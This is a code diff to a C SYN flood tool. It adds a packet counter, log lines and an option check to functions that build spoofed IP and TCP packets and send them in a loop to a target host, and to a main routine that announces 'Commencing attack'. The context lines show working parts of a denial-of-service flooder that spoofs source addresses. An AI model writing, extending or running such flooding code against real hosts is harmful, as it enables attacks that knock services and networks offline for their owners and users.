@@ -12,6 +12,8 @@ extern bool enable_attack_time;  /* Defined in cli.c */
 extern bool enable_wait_time;  /* Defined in cli.c */
 extern bool enable_loop_count;  /* Defined in cli.c */
 
+int loops_done = 0 ; 
+
 void
 sigalrm_handler (int signo)
 {
@@ -136,6 +138,8 @@ synflood_t (char *hostname, unsigned int port, struct sockaddr_in host_addr)
   struct iphdr *ip_headers = (struct iphdr *) packet;
   struct tcphdr *tcp_headers = (struct tcphdr *) (ip_headers + 1);
 
+  vlog ( "synflood_t started \n" ) ; 
+
   while (attack) {
     /* Because we want to spoof the IP address and port number of each packet, we will need to
      * reconstruct the packet each time we want to send one. */
@@ -145,6 +149,7 @@ synflood_t (char *hostname, unsigned int port, struct sockaddr_in host_addr)
     if (sendto(sockfd, packet, PACKET_BUFFER_LEN, 0, (struct sockaddr *) &host_addr, sizeof(struct sockaddr_in)) == -1)
       die("%d: Failed to send packet: %s\n", __LINE__ - 1, strerror(errno));
     memset(packet, 0x0, sizeof(uint8_t) * PACKET_BUFFER_LEN);
+    loops_done++ ; 
   }
 }
 
@@ -163,6 +168,8 @@ synflood_c (char *hostname, unsigned int port, struct sockaddr_in host_addr, uns
   struct tcphdr *tcp_headers = (struct tcphdr *) (ip_headers + 1);
   int i ; 
 
+  vlog ( "synflood_c started \n" ) ; 
+
   for ( i=0; i<loop; i++ )  {
     /* Because we want to spoof the IP address and port number of each packet, we will need to
      * reconstruct the packet each time we want to send one. */
@@ -172,6 +179,7 @@ synflood_c (char *hostname, unsigned int port, struct sockaddr_in host_addr, uns
     if (sendto(sockfd, packet, PACKET_BUFFER_LEN, 0, (struct sockaddr *) &host_addr, sizeof(struct sockaddr_in)) == -1)
       die("%d: Failed to send packet: %s\n", __LINE__ - 1, strerror(errno));
     memset(packet, 0x0, sizeof(uint8_t) * PACKET_BUFFER_LEN);
+    loops_done++ ; 
   }
 
   struct timeval time;
@@ -238,6 +246,11 @@ main (int argc, char *argv[], char *envp[])
       sniff(hostname, port);
   }
 
+  if ( ! ( enable_attack_time ^ enable_loop_count ) ) { 
+      vlog ( "nothing done, either --attack-time or --loop-count must be enabled \n" ) ; 
+      return EXIT_FAILURE ; 
+  } 
+
   vlog("Commencing attack in %d %s.\n", SUSPENSE_TIME, SUSPENSE_TIME == 1 ? "second" : "seconds");
   sleep(SUSPENSE_TIME);
 
@@ -254,6 +267,7 @@ main (int argc, char *argv[], char *envp[])
   } ; 
 
   sleep(wait_time);
+  vlog("number of packets sent out: %d \n" , loops_done ) ; 
   vlog("job finished \n" ) ; 
   
   /* It seems like pcap spawns some kind of weird daemon or regular child process that we can't
